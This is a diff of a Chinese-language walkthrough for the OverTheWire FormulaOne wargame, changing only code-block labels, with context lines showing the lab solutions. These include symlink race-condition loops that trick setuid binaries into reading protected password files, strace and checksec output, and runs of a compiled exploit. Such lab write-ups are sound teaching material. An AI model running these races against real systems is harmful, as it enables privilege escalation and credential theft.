@@ -16,7 +16,7 @@
 
 首先，可以在 `Bandit` 这部分 wargame 中找到 `FormulaOne` 的资源
 
-```shell
+```bash
 bandit1@bandit:~$ hostnamectl
  Static hostname: bandit
        Icon name: computer-vm
@@ -279,13 +279,13 @@ if __name__ == "__main__":
 
 登录 `Level 0` 账户
 
-```shell
+```bash
 ssh formulaone0@formulaone.labs.overthewire.org -p 2232
 ```
 
 即可进入 `formulaone0` 用户
 
-```shell
+```bash
 formulaone0@bandit:~$ whoami
 formulaone0
 ```
@@ -328,7 +328,7 @@ int f = open(argv[1], O_RDONLY);
 
 尝试进行条件竞争，启动两个 SSH 会话，分别执行以下两个会话
 
-```shell
+```bash
 for i in $(seq 100000);do /formulaone/formulaone1 /tmp/randark/12341;done
 
 for i in $(seq 10000);do rm /tmp/randark/12341;echo 1234 > /tmp/randark/12341;rm /tmp/randark/12341;ln -sv /etc/formulaone_pass/formulaone1 /tmp/randark/12341;done
@@ -342,13 +342,13 @@ for i in $(seq 10000);do rm /tmp/randark/12341;echo 1234 > /tmp/randark/12341;rm
 
 登录 `Level 1` 账户
 
-```shell
+```bash
 ssh formulaone1@formulaone.labs.overthewire.org -p 2232
 ```
 
 查看本轮挑战
 
-```shell
+```bash
 -rwsr-x--- 1 formulaone2 formulaone1  15K Sep 19 07:09 formulaone2
 drwxr-xr-x 2 root        root        4.0K Sep 19 07:09 formulaone2_src
 ```
@@ -469,7 +469,7 @@ if __name__ == "__main__":
 
 先执行全部所有 `/tmp/tmp_????` 文件都建立指向 `/etc/formulaone_pass/formulaone2` 的软连接
 
-```shell
+```bash
 formulaone1@bandit:/tmp/randark$ python3 formulaone2.py
 Enter action (create/clear/link): link
 Enter source path: /etc/formulaone_pass/formulaone2
@@ -541,7 +541,7 @@ int main() {
 
 开两个 SSH 会话，各自执行
 
-```shell
+```bash
 # compiled from c code above
 ./death
 
@@ -558,7 +558,7 @@ for i in $(seq 1000);do echo $i; /formulaone/formulaone2 ;done
 
 登录 `Level 2` 账户
 
-```shell
+```bash
 ssh formulaone2@formulaone.labs.overthewire.org -p 2232
 ```
 
@@ -615,7 +615,7 @@ int main(int argc, char *argv[])
 
 首先，先尝试使用 `strace` 跟踪程序执行，不带任何参数执行一次
 
-```shell
+```bash
 formulaone2@bandit:/formulaone$ strace /formulaone/formulaone3
 execve("/formulaone/formulaone3", ["/formulaone/formulaone3"], 0x7fffffffe340 /* 27 vars */) = 0
 [Process PID=1790473 runs in 32 bit mode.]
@@ -653,7 +653,7 @@ exit_group(0)                           = ?
 
 然后带上一个参数执行一次
 
-```shell
+```bash
 formulaone2@bandit:/formulaone$ strace /formulaone/formulaone3 abc
 execve("/formulaone/formulaone3", ["/formulaone/formulaone3", "abc"], 0x7fffffffe338 /* 27 vars */) = 0
 [Process PID=1790503 runs in 32 bit mode.]
@@ -693,7 +693,7 @@ exit_group(0)                           = ?
 
 很明显，多了几步
 
-```shell
+```bash
 shmget(0xadc00adc, 8192, IPC_CREAT|0777) = 0
 shmat(0, NULL, SHM_EXEC)                = 0xf7fbf000
 ```
@@ -708,7 +708,7 @@ shmat(0, NULL, SHM_EXEC)                = 0xf7fbf000
 
 并且检查程序的保护措施
 
-```shell
+```bash
 formulaone2@bandit:/tmp/randark/formulaone-3$ checksec --dir=/formulaone | grep formulaone3
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  Fortified     Fortifiable    Filename
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   46 Symbols      No       0             1              /formulaone/formulaone3-hard
@@ -804,7 +804,7 @@ int main(int argc, char *argv[])
 
 开两个 SSH 会话，各自执行
 
-```shell
+```bash
 # compiled from c code above
 ./exp
 
@@ -821,7 +821,7 @@ for i in $(seq 1000);do echo $i; /formulaone/formulaone3 D ;done
 
 登录 `Level 3` 账户
 
-```shell
+```bash
 ssh formulaone3@formulaone.labs.overthewire.org -p 2232
 ```
 
